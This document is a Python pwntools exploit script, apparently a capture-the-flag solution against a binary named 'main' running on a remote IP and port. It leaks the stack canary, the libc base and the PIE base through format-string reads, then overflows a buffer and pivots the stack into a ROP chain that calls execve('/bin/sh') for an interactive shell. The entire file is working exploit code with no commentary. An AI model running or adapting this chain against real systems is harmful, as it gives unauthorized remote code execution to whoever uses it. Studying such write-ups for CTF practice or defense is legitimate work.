#coding=utf-8
from pwn import *
p = process('./main')
p = remote('124.156.121.112',28017)
elf = ELF('./main')
libc =ELF('./libc-2.23.so',checksec=False)
context.log_level = 'DEBUG'
#leak the canary
p.sendlineafter('你怎么了？\n','%9$p')
canary = int(p.recv(18),16)
p.sendafter('烫烫烫烫\n','FMYY')

#leak the libc
p.sendafter('远一点！\n','\x00'*0x38 + p64(canary) + '\x00'*0x10 + p64(0) + '\x03')
p.send('%23$p')
p.recvline()
libc_base = int(p.recv(14),16) - 240 - libc.sym['__libc_start_main']

binsh = libc_base + libc.search('/bin/sh').next()
execve = libc_base + libc.sym['execve']
pop_rdx_ret = libc_base + 0x01B92
p.sendafter('烫烫烫烫\n','FMYY')
p.sendafter('远一点！\n','\x00'*0x38 + p64(canary) + '\x00'*0x10 + p64(0) + '\x03')

#leak the pie
p.sendafter('你怎么了？\n','%11$p')
pie = int(p.recv(14),16) - 100 - elf.sym['main']
leave_ret = pie + 0x9CA
pop_rdi_ret = pie + 0xB43
pop_rsi_r15 = pie + 0xB41
target = pie + (0x201040+0x108)
rce = libc_base + 0x4526A-6
ret = pie + 0x295

#---------getshell
payload  = '\x00'*0x108
payload += p64(0)
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(pop_rdx_ret)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(execve)
p.sendafter('烫烫烫烫\n',payload)
p.sendafter('远一点！\n','\x00'*0x38 + p64(canary) + '\x00'*0x10 + p64(target) + p64(leave_ret))
p.interactive()
